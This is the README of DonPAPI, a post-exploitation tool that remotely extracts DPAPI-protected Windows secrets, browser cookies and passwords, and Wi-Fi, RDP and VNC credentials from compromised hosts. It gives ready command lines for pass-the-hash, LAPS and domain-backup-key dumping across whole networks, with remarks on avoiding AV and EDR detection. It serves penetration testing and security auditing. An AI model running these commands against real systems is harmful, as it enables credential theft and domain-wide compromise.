# DonPAPI
Dumping revelant information on compromised targets without AV detection

## DPAPI dumping
Lots of credentials are protected by DPAPI (link )
We aim at locating those "secured" credentials, and retreive them using :
- user password
- domaine DPAPI BackupKey
- Local machine DPAPI Key (that protect TaskScheduled Blob)

## Curently gathered info: 
- Windows credentials (Taskscheduled credentials & a lot more)
- Windows Vaults
- Windows RDP credentials 
- AdConnect (still require a manual operation)
- Wifi key
- Intenet explorer Creentials
- Chrome cookies & credentials
- Firefox cookies & credentials 
- VNC passwords
- mRemoteNG password (with default config)

## Check for a bit of compliance
- smb signing enabled
- OS/Domain/Hostname/Ip of the audited scope

## Operational use 
with local admin account on a machine, we can :
- gather Machine protected DPAPI secrets, like ScheduledTask, that will contains cleartext login/password of the account that should run the task (Also Wifi passwords)
- extract Masterkey's hash value for every users profiles (masterkeys beeing protected by the user's password, let's try to crack them with Hashcat)
- Identify who is connected from where, in order to identify Admin's personal machines. 
- extract other non-dpapi protected secrets (VNC/Firefox/mRemoteNG)

With a user password, or the domain PVK we can unprotect it's DPAPI Secrets. 
you can pass a full list of credentials that will be tested on the machine.
- gather protected secrets from IE, Chrome, Firefox and start reaching the Azure tenant. 

## Exemples 
dump all secrets of our target machine with an admin account : 

```python DonPAPI.py Domain/user:passw0rd@target```

connect with PTH

```python DonPAPI.py -Hashes XXXXXXXXXX Domain/user@target```

can do kerberos (-k), and local auth (-local_auth)

connect with an account that have LAPS rights:

```python DonPAPI.py -laps Domain/user:passw0rd@target```

you have a few users passwords ? just give them to DonPAPI and it will try to use them to decipher masterkeys of these users. (the file have to contain user:pass, one per line)

```python DonPAPI.py -credz credz_file Domain/user:passw0rd@target```

you got domain admin access and dumped the domain backup key ? (impacket dpapi.py backupkey --export). them dump all secrets of all users of the domain !

`python DonPAPI.py -pvk domain_backupkey.pvk -credz file_with_Login:pass Domain/user:passw0rd@domain_network_list`

target can be an IP, IP range, CIDR, file containing list of the above targets (one per line)


## Opsec consideration
The RemoteOps part can be spoted by some EDR. 
has it's only real use is to get DPAPI Machine key, it could be deactivated (--no_remoteops). but no more taskscheduled credentials in that case.

# INSTALL 
```
git clone https://github.com/login-securite/DonPAPI.git
pip install -r requirements.txt
python3 DonPAPI.py
```

# Credits
All the credits goes to these great guys for doing the hard research & coding : 
- Benjamin Delpy (@gentilkiwi) for most of the DPAPI research (always greatly commented - <3 your code)
- Alberto Solino (@agsolino) for the tremendous work of Impacket (https://github.com/SecureAuthCorp/impacket). Almost everything we do here comes from impacket. 
- Alesandro Z (@) & everyone who worked on Lazagne (https://github.com/AlessandroZ/LaZagne/wiki) for the VNC & Firefox modules, and most likely for a lots of other ones in the futur. 
- dirkjanm @dirkjanm for the base code of adconnect dump (https://github.com/fox-it/adconnectdump) & every research he ever did. i learned so much on so many subjects thanks to you. <3
- @Byt3bl3d33r for CME (lots of inspiration and code comes from CME : https://github.com/byt3bl33d3r/CrackMapExec )
- All the Team of @LoginSecurite for their help in debugging my shity code (special thanks to @layno & @HackAndDo for that)

# TODO
- finish ADSync/ADConnect password extraction
- CREDHISTORY full extraction
- extract windows Certificates
- further analyse ADAL/msteams
- implement Chrome <v80 decoder
- find a way to implement Lazagne's great modules